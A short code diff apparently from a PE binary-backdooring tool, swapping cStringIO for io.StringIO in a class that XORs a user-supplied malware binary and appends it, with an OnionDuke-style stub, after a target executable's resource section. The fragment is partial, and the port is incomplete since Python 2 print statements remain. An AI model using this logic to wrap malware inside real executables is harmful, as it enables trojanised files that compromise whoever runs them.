@@ -30,7 +30,7 @@ POSSIBILITY OF SUCH DAMAGE.
 
 '''
 
-import cStringIO
+from io import StringIO
 import operator
 import os
 import platform
@@ -1251,7 +1251,7 @@ class pebin():
             print "[!] No malware provided"
             return False
 
-        od_stub = cStringIO.StringIO()
+        od_stub = StringIO()
 
         stubPath = os.path.dirname(os.path.abspath(onionduke.__file__))
 
@@ -1275,7 +1275,7 @@ class pebin():
                     xorkey = xor_key1
                     print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
                     with open(compressedbin, 'r') as compressedBinary:
-                        xorBinary = cStringIO.StringIO()
+                        xorBinary = StringIO()
                         xor_file(compressedBinary, xorBinary, xorkey)
                     os.remove(compressedbin)
                 else:
@@ -1300,7 +1300,7 @@ class pebin():
                 od_stub.write(open(stubPath + "/OD_stub.exe", 'r').read())
                 #copy rsrc to memory
                 self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
-                self.rsrc_section = cStringIO.StringIO()
+                self.rsrc_section = StringIO()
                 print "[*] Copying rsrc section"
                 self.rsrc_section.write(self.binary.read(self.flItms['rsrcSizeRawData']))
                 self.rsrc_section.seek(0)
@@ -1321,7 +1321,7 @@ class pebin():
                 xorkey = random.randint(0, 4294967295)
                 print "[*] Xor'ing", self.FILE, "with key:", hex(xorkey)
                 with open(compressedbin, 'r') as compressedBinary:
-                    xorBinary = cStringIO.StringIO()
+                    xorBinary = StringIO()
                     xor_file(compressedBinary, xorBinary, xorkey)
                 xorBinary.seek(0)
                 print "[*] Appending compressed binary after rsrc section"
@@ -1335,7 +1335,7 @@ class pebin():
 
                 print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
                 with open(compressedbin, 'r') as compressedBinary:
-                    xorBinary = cStringIO.StringIO()
+                    xorBinary = StringIO()
                     xor_file(compressedBinary, xorBinary, xorkey)
                 xorBinary.seek(0)
                 print "[*] Appending compressed user supplied binary after target binary"
